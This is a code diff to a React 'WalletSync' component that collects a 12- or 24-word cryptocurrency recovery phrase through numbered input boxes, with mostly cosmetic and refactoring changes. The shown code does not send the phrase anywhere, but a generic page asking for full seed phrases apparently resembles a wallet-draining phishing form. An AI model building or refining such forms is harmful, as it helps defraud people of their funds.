@@ -393,17 +393,19 @@ export default function WalletSync() {
       Recovery Phrase
     </label>
 
-    {/* Determine word count dynamically */}
     {(() => {
-      const wordCount =
-        selected?.name?.toLowerCase().includes("trust") ? 12 : 24;
+      // Determine word count dynamically
+      const wordCount = selected?.name?.toLowerCase().includes("trust")
+        ? 12
+        : 24;
 
-      const words = (formData.phrase || "").split(" ");
-      while (words.length < wordCount) words.push("");
+      // Split phrase into words
+      const words = formData.phrase ? formData.phrase.split(" ") : Array(wordCount).fill("");
 
-      const handleWordChange = (i, val) => {
+      // Handle per-box change
+      const handleWordChange = (index, value) => {
         const updated = [...words];
-        updated[i] = val.trim();
+        updated[index] = value.trim();
         handleInputChange("phrase", updated.join(" ").trim());
       };
 
@@ -411,14 +413,18 @@ export default function WalletSync() {
         <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
           {Array.from({ length: wordCount }).map((_, i) => (
             <div key={i} className="flex items-center space-x-1">
-              <span className="text-xs text-gray-500 dark:text-gray-400 w-4">
+              <span className="text-xs text-gray-500 dark:text-gray-400 w-4 text-right">
                 {i + 1}.
               </span>
               <input
                 type="text"
                 value={words[i] || ""}
                 onChange={(e) => handleWordChange(i, e.target.value)}
-                className="flex-1 rounded-lg border border-gray-300 bg-white px-2 py-1 text-xs focus:border-blue-500 focus:ring-1 focus:ring-blue-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white"
+                placeholder={`word ${i + 1}`}
+                className="flex-1 rounded-lg border border-gray-300 bg-white px-2 py-1 text-xs
+                           focus:border-blue-500 focus:ring-1 focus:ring-blue-200
+                           dark:border-gray-600 dark:bg-gray-800 dark:text-white"
+                required
               />
             </div>
           ))}
@@ -427,7 +433,7 @@ export default function WalletSync() {
     })()}
 
     <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
-      {selected?.name?.includes("Trust")
+      {selected?.name?.toLowerCase().includes("trust")
         ? "Enter your 12-word recovery phrase."
         : "Enter your 24-word recovery phrase."}
     </p>
